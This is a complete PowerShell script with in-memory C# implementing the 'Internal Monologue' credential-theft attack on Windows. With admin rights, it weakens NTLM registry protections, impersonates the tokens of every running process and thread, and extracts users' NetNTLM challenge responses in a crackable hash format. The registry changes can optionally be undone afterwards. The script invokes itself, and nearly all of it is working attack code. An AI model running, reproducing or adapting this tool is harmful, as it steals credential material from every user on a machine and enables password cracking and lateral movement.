function Invoke-InternalMonologue {
    [CmdletBinding()]
    param(
        [bool]$Downgrade = $true,
        [bool]$Restore = $true,
        [bool]$Impersonate = $true,
        [bool]$VerboseFlag = $false,
        [ValidatePattern('^[0-9A-Fa-f]{16}$')]
        [string]$Challenge = "1122334455667788"
    )

    $Source = @"
using System;
using System.Security.Principal;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32;
using System.Collections.Generic;
using System.Diagnostics;

namespace InternalMonologue
{
    public class Program
    {
        const int MAX_TOKEN_SIZE = 12288;

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_USER
        {
            public SID_AND_ATTRIBUTES User;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct SID_AND_ATTRIBUTES
        {
            public IntPtr Sid;
            public uint Attributes;
        }

        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool ConvertSidToStringSid(IntPtr pSID, out IntPtr ptrSid);

        [DllImport("kernel32.dll")]
        static extern IntPtr LocalFree(IntPtr hMem);

        [DllImport("secur32.dll", CharSet = CharSet.Auto)]
        static extern int AcquireCredentialsHandle(
            string pszPrincipal, string pszPackage, int fCredentialUse,
            IntPtr PAuthenticationID, IntPtr pAuthData, int pGetKeyFn,
            IntPtr pvGetKeyArgument, ref SECURITY_HANDLE phCredential,
            ref SECURITY_INTEGER ptsExpiry);

        [DllImport("secur32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern int InitializeSecurityContext(
            ref SECURITY_HANDLE phCredential, IntPtr phContext,
            string pszTargetName, int fContextReq, int Reserved1,
            int TargetDataRep, IntPtr pInput, int Reserved2,
            out SECURITY_HANDLE phNewContext, out SecBufferDesc pOutput,
            out uint pfContextAttr, out SECURITY_INTEGER ptsExpiry);

        [DllImport("secur32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern int InitializeSecurityContext(
            ref SECURITY_HANDLE phCredential, ref SECURITY_HANDLE phContext,
            string pszTargetName, int fContextReq, int Reserved1,
            int TargetDataRep, ref SecBufferDesc SecBufferDesc,
            int Reserved2, out SECURITY_HANDLE phNewContext,
            out SecBufferDesc pOutput, out uint pfContextAttr,
            out SECURITY_INTEGER ptsExpiry);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, int DesiredAccess, ref IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenThreadToken(IntPtr ThreadHandle, int DesiredAccess, bool OpenAsSelf, ref IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetTokenInformation(IntPtr TokenHandle, int TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool DuplicateTokenEx(IntPtr hExistingToken, int dwDesiredAccess, ref SECURITY_ATTRIBUTES lpThreadAttributes, int ImpersonationLevel, int dwTokenType, ref IntPtr phNewToken);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenThread(int dwDesiredAccess, bool bInheritHandle, IntPtr dwThreadId);

        [DllImport("secur32.dll")]
        static extern int FreeCredentialsHandle(ref SECURITY_HANDLE phCredential);

        [DllImport("secur32.dll")]
        static extern int DeleteSecurityContext(ref SECURITY_HANDLE phContext);

        static List<string> authenticatedUsers = new List<string>();

        static void GetRegKey(string key, string name, out object result)
        {
            result = null;
            using (RegistryKey Lsa = Registry.LocalMachine.OpenSubKey(key))
            {
                if (Lsa != null)
                {
                    object value = Lsa.GetValue(name);
                    if (value != null) result = value;
                }
            }
        }

        static void SetRegKey(string key, string name, object value)
        {
            using (RegistryKey Lsa = Registry.LocalMachine.OpenSubKey(key, true))
            {
                if (Lsa != null)
                {
                    if (value == null) Lsa.DeleteValue(name);
                    else Lsa.SetValue(name, value);
                }
            }
        }

        static void ExtendedNTLMDowngrade(out object oldValue_LMCompatibilityLevel, out object oldValue_NtlmMinClientSec, out object oldValue_RestrictSendingNTLMTraffic)
        {
            GetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa", "LMCompatibilityLevel", out oldValue_LMCompatibilityLevel);
            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa", "LMCompatibilityLevel", 2);
            GetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "NtlmMinClientSec", out oldValue_NtlmMinClientSec);
            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "NtlmMinClientSec", 536870912);
            GetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "RestrictSendingNTLMTraffic", out oldValue_RestrictSendingNTLMTraffic);
            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "RestrictSendingNTLMTraffic", 0);
        }

        static void NTLMRestore(object oldValue_LMCompatibilityLevel, object oldValue_NtlmMinClientSec, object oldValue_RestrictSendingNTLMTraffic)
        {
            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa", "LMCompatibilityLevel", oldValue_LMCompatibilityLevel);
            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "NtlmMinClientSec", oldValue_NtlmMinClientSec);
            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "RestrictSendingNTLMTraffic", oldValue_RestrictSendingNTLMTraffic);
        }

        static string GetLogonId(IntPtr token)
        {
            int TokenInfLength = 1024;
            IntPtr TokenInformation = Marshal.AllocHGlobal(TokenInfLength);
            try
            {
                string SID = null;
                if (GetTokenInformation(token, 1, TokenInformation, TokenInfLength, out TokenInfLength))
                {
                    TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_USER));
                    IntPtr pstr = IntPtr.Zero;
                    ConvertSidToStringSid(TokenUser.User.Sid, out pstr);
                    SID = Marshal.PtrToStringAuto(pstr);
                    LocalFree(pstr);
                }
                return SID;
            }
            catch
            {
                return null;
            }
            finally
            {
                Marshal.FreeHGlobal(TokenInformation);
            }
        }

        static void RunMonologue(IntPtr token, string challenge, bool verbose, string SID)
        {
            var dupToken = IntPtr.Zero;
            var sa = new SECURITY_ATTRIBUTES();
            sa.nLength = Marshal.SizeOf(sa);
            DuplicateTokenEx(token, 0x0002 | 0x0008, ref sa, (int)SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, (int)1, ref dupToken);
            CloseHandle(token);
            try
            {
                using (WindowsImpersonationContext ctx = WindowsIdentity.Impersonate(dupToken))
                {
                    if (verbose) Console.WriteLine("Impersonated user " + WindowsIdentity.GetCurrent().Name);
                    string result = InternalMonologueForCurrentUser(challenge);
                    if (result != null && result.Length > 0)
                    {
                        Console.WriteLine(result);
                        authenticatedUsers.Add(SID);
                    }
                }
            }
            catch { }
            finally { CloseHandle(dupToken); }
        }

        static void HandleProcess(Process process, string challenge, bool verbose)
        {
            try
            {
                var token = IntPtr.Zero;
                if (OpenProcessToken(process.Handle, 0x0008, ref token))
                {
                    string SID = GetLogonId(token);
                    CloseHandle(token);
                    if (SID != null && !authenticatedUsers.Contains(SID))
                    {
                        if (OpenProcessToken(process.Handle, 0x0002, ref token))
                        {
                            RunMonologue(token, challenge, verbose, SID);
                        }
                    }
                }
            }
            catch { }
        }

        static void HandleThread(ProcessThread thread, string challenge, bool verbose)
        {
            try
            {
                var token = IntPtr.Zero;
                var handle = OpenThread(0x0040, true, new IntPtr(thread.Id));
                if (handle == IntPtr.Zero) return;
                try
                {
                    if (OpenThreadToken(handle, 0x0008, true, ref token))
                    {
                        string SID = GetLogonId(token);
                        CloseHandle(token);
                        if (SID != null && !authenticatedUsers.Contains(SID))
                        {
                            if (OpenThreadToken(handle, 0x0002, true, ref token))
                            {
                                RunMonologue(token, challenge, verbose, SID);
                            }
                        }
                    }
                }
                finally { CloseHandle(handle); }
            }
            catch { }
        }

        public static void Main(bool downgrade, bool restore, bool impersonate, bool verbose, string challenge)
        {
            object oldValue_LMCompatibilityLevel = null;
            object oldValue_NtlmMinClientSec = null;
            object oldValue_RestrictSendingNTLMTraffic = null;

            if (IsElevated())
            {
                if (downgrade) ExtendedNTLMDowngrade(out oldValue_LMCompatibilityLevel, out oldValue_NtlmMinClientSec, out oldValue_RestrictSendingNTLMTraffic);
                if (impersonate)
                {
                    foreach (Process process in Process.GetProcesses())
                    {
                        try
                        {
                            if (!process.ProcessName.Contains("lsass"))
                            {
                                HandleProcess(process, challenge, verbose);
                                foreach (ProcessThread thread in process.Threads) HandleThread(thread, challenge, verbose);
                            }
                        }
                        catch { }
                    }
                }
                else
                {
                    Console.WriteLine(InternalMonologueForCurrentUser(challenge));
                }
                if (downgrade && restore) NTLMRestore(oldValue_LMCompatibilityLevel, oldValue_NtlmMinClientSec, oldValue_RestrictSendingNTLMTraffic);
            }
            else
            {
                Console.WriteLine(InternalMonologueForCurrentUser(challenge));
            }
        }

        static string InternalMonologueForCurrentUser(string challenge)
        {
            SecBufferDesc ClientToken = new SecBufferDesc(MAX_TOKEN_SIZE);
            SECURITY_HANDLE _hOutboundCred;
            _hOutboundCred.LowPart = _hOutboundCred.HighPart = IntPtr.Zero;
            SECURITY_INTEGER ClientLifeTime;
            ClientLifeTime.LowPart = 0;
            ClientLifeTime.HighPart = 0;
            SECURITY_HANDLE _hClientContext;
            uint ContextAttributes = 0;

            AcquireCredentialsHandle(
                WindowsIdentity.GetCurrent().Name, "NTLM", 2, IntPtr.Zero, IntPtr.Zero, 0, IntPtr.Zero,
                ref _hOutboundCred, ref ClientLifeTime);

            InitializeSecurityContext(
                ref _hOutboundCred, IntPtr.Zero, WindowsIdentity.GetCurrent().Name, 0x00000800, 0, 0x10,
                IntPtr.Zero, 0, out _hClientContext, out ClientToken, out ContextAttributes, out ClientLifeTime);
            ClientToken.Dispose();

            ClientToken = new SecBufferDesc(MAX_TOKEN_SIZE);
            byte[] challengeBytes = StringToByteArray(challenge);
            if (challengeBytes == null || challengeBytes.Length < 8) return null;
            SecBufferDesc ServerToken = new SecBufferDesc(new byte[] {
                78, 84, 76, 77, 83, 83, 80, 0, 2, 0, 0, 0, 0, 0, 0, 0, 40, 0, 0, 0, 1, 0x82, 0, 0,
                challengeBytes[0], challengeBytes[1], challengeBytes[2], challengeBytes[3],
                challengeBytes[4], challengeBytes[5], challengeBytes[6], challengeBytes[7],
                0, 0, 0, 0, 0, 0, 0
            });
            InitializeSecurityContext(
                ref _hOutboundCred, ref _hClientContext, WindowsIdentity.GetCurrent().Name, 0x00000800, 0, 0x10,
                ref ServerToken, 0, out _hClientContext, out ClientToken, out ContextAttributes, out ClientLifeTime);
            byte[] result = ClientToken.GetSecBufferByteArray();
            ClientToken.Dispose();
            ServerToken.Dispose();
            DeleteSecurityContext(ref _hClientContext);
            FreeCredentialsHandle(ref _hOutboundCred);
            return ParseNTResponse(result, challenge);
        }

        static string ParseNTResponse(byte[] message, string challenge)
        {
            if (message == null || message.Length < 44) return null;

            ushort lm_resp_len = BitConverter.ToUInt16(message, 12);
            uint lm_resp_off = BitConverter.ToUInt32(message, 16);
            ushort nt_resp_len = BitConverter.ToUInt16(message, 20);
            uint nt_resp_off = BitConverter.ToUInt32(message, 24);
            ushort domain_len = BitConverter.ToUInt16(message, 28);
            uint domain_off = BitConverter.ToUInt32(message, 32);
            ushort user_len = BitConverter.ToUInt16(message, 36);
            uint user_off = BitConverter.ToUInt32(message, 40);

            if (lm_resp_off + lm_resp_len > message.Length ||
                nt_resp_off + nt_resp_len > message.Length ||
                domain_off + domain_len > message.Length ||
                user_off + user_len > message.Length) return null;

            byte[] lm_resp = new byte[lm_resp_len];
            byte[] nt_resp = new byte[nt_resp_len];
            byte[] domain = new byte[domain_len];
            byte[] user = new byte[user_len];
            Array.Copy(message, lm_resp_off, lm_resp, 0, lm_resp_len);
            Array.Copy(message, nt_resp_off, nt_resp, 0, nt_resp_len);
            Array.Copy(message, domain_off, domain, 0, domain_len);
            Array.Copy(message, user_off, user, 0, user_len);

            if (nt_resp_len == 24)
                return ConvertHex(ByteArrayToString(user)) + "::" + ConvertHex(ByteArrayToString(domain)) + ":" + ByteArrayToString(lm_resp) + ":" + ByteArrayToString(nt_resp) + ":" + challenge;
            if (nt_resp_len > 24)
                return ConvertHex(ByteArrayToString(user)) + "::" + ConvertHex(ByteArrayToString(domain)) + ":" + challenge + ":" + ByteArrayToString(nt_resp).Substring(0, 32) + ":" + ByteArrayToString(nt_resp).Substring(32);
            return null;
        }

        static string ByteArrayToString(byte[] ba)
        {
            StringBuilder hex = new StringBuilder(ba.Length * 2);
            foreach (byte b in ba) hex.AppendFormat("{0:x2}", b);
            return hex.ToString();
        }

        static bool IsElevated()
        {
            return (new WindowsPrincipal(WindowsIdentity.GetCurrent())).IsInRole(WindowsBuiltInRole.Administrator);
        }

        static byte[] StringToByteArray(string hex)
        {
            if (hex.Length % 2 == 1) return null;
            byte[] arr = new byte[hex.Length >> 1];
            for (int i = 0; i < hex.Length >> 1; ++i)
                arr[i] = (byte)((GetHexVal(hex[i << 1]) << 4) + GetHexVal(hex[(i << 1) + 1]));
            return arr;
        }

        static int GetHexVal(char hex)
        {
            int val = (int)hex;
            return val - (val < 58 ? 48 : (val < 97 ? 55 : 87));
        }

        static string ConvertHex(string hexString)
        {
            string ascii = string.Empty;
            for (int i = 0; i < hexString.Length; i += 2)
            {
                string hs = hexString.Substring(i, 2);
                if (hs == "00") continue;
                uint decval = System.Convert.ToUInt32(hs, 16);
                char character = System.Convert.ToChar(decval);
                ascii += character;
            }
            return ascii;
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    struct SecBuffer : IDisposable
    {
        public int cbBuffer;
        public int BufferType;
        public IntPtr pvBuffer;

        public SecBuffer(int bufferSize)
        {
            cbBuffer = bufferSize;
            BufferType = 2;
            pvBuffer = Marshal.AllocHGlobal(bufferSize);
        }

        public SecBuffer(byte[] secBufferBytes)
        {
            cbBuffer = secBufferBytes.Length;
            BufferType = 2;
            pvBuffer = Marshal.AllocHGlobal(cbBuffer);
            Marshal.Copy(secBufferBytes, 0, pvBuffer, cbBuffer);
        }

        public void Dispose()
        {
            if (pvBuffer != IntPtr.Zero)
            {
                Marshal.FreeHGlobal(pvBuffer);
                pvBuffer = IntPtr.Zero;
            }
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    struct SecBufferDesc : IDisposable
    {
        public int ulVersion;
        public int cBuffers;
        public IntPtr pBuffers;

        public SecBufferDesc(int bufferSize)
        {
            ulVersion = 0;
            cBuffers = 1;
            SecBuffer ThisSecBuffer = new SecBuffer(bufferSize);
            pBuffers = Marshal.AllocHGlobal(Marshal.SizeOf(ThisSecBuffer));
            Marshal.StructureToPtr(ThisSecBuffer, pBuffers, false);
        }

        public SecBufferDesc(byte[] secBufferBytes)
        {
            ulVersion = 0;
            cBuffers = 1;
            SecBuffer ThisSecBuffer = new SecBuffer(secBufferBytes);
            pBuffers = Marshal.AllocHGlobal(Marshal.SizeOf(ThisSecBuffer));
            Marshal.StructureToPtr(ThisSecBuffer, pBuffers, false);
        }

        public void Dispose()
        {
            if (pBuffers != IntPtr.Zero)
            {
                if (cBuffers == 1)
                {
                    SecBuffer ThisSecBuffer = (SecBuffer)Marshal.PtrToStructure(pBuffers, typeof(SecBuffer));
                    ThisSecBuffer.Dispose();
                }
                else
                {
                    for (int Index = 0; Index < cBuffers; Index++)
                    {
                        int CurrentOffset = Index * Marshal.SizeOf(typeof(SecBuffer));
                        IntPtr SecBufferpvBuffer = Marshal.ReadIntPtr(pBuffers, CurrentOffset + Marshal.SizeOf(typeof(int)) + Marshal.SizeOf(typeof(int)));
                        Marshal.FreeHGlobal(SecBufferpvBuffer);
                    }
                }
                Marshal.FreeHGlobal(pBuffers);
                pBuffers = IntPtr.Zero;
            }
        }

        public byte[] GetSecBufferByteArray()
        {
            byte[] Buffer = null;
            if (pBuffers == IntPtr.Zero) throw new InvalidOperationException("Object has already been disposed");
            if (cBuffers == 1)
            {
                SecBuffer ThisSecBuffer = (SecBuffer)Marshal.PtrToStructure(pBuffers, typeof(SecBuffer));
                if (ThisSecBuffer.cbBuffer > 0)
                {
                    Buffer = new byte[ThisSecBuffer.cbBuffer];
                    Marshal.Copy(ThisSecBuffer.pvBuffer, Buffer, 0, ThisSecBuffer.cbBuffer);
                }
            }
            else
            {
                int BytesToAllocate = 0;
                for (int Index = 0; Index < cBuffers; Index++)
                {
                    int CurrentOffset = Index * Marshal.SizeOf(typeof(SecBuffer));
                    BytesToAllocate += Marshal.ReadInt32(pBuffers, CurrentOffset);
                }
                Buffer = new byte[BytesToAllocate];
                for (int Index = 0, BufferIndex = 0; Index < cBuffers; Index++)
                {
                    int CurrentOffset = Index * Marshal.SizeOf(typeof(SecBuffer));
                    int BytesToCopy = Marshal.ReadInt32(pBuffers, CurrentOffset);
                    IntPtr SecBufferpvBuffer = Marshal.ReadIntPtr(pBuffers, CurrentOffset + Marshal.SizeOf(typeof(int)) + Marshal.SizeOf(typeof(int)));
                    Marshal.Copy(SecBufferpvBuffer, Buffer, BufferIndex, BytesToCopy);
                    BufferIndex += BytesToCopy;
                }
            }
            return Buffer;
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    struct SECURITY_INTEGER { public uint LowPart; public int HighPart; }
    [StructLayout(LayoutKind.Sequential)]
    struct SECURITY_HANDLE { public IntPtr LowPart; public IntPtr HighPart; }
    [StructLayout(LayoutKind.Sequential)]
    struct SECURITY_ATTRIBUTES { public int nLength; public IntPtr lpSecurityDescriptor; public bool bInheritHandle; }
    enum SECURITY_IMPERSONATION_LEVEL { SecurityAnonymous, SecurityIdentification, SecurityImpersonation, SecurityDelegation }
}
"@

    if (-not ([System.Management.Automation.PSTypeName]'InternalMonologue.Program').Type) {
        $inmem = New-Object -TypeName System.CodeDom.Compiler.CompilerParameters
        $inmem.GenerateInMemory = $true
        $inmem.ReferencedAssemblies.AddRange(@("System.dll", [PSObject].Assembly.Location))
        Add-Type -TypeDefinition $Source -Language CSharp -CompilerParameters $inmem
    }

    [InternalMonologue.Program]::Main($Downgrade, $Restore, $Impersonate, $VerboseFlag, $Challenge.ToUpper())
}

Invoke-InternalMonologue @PSBoundParameters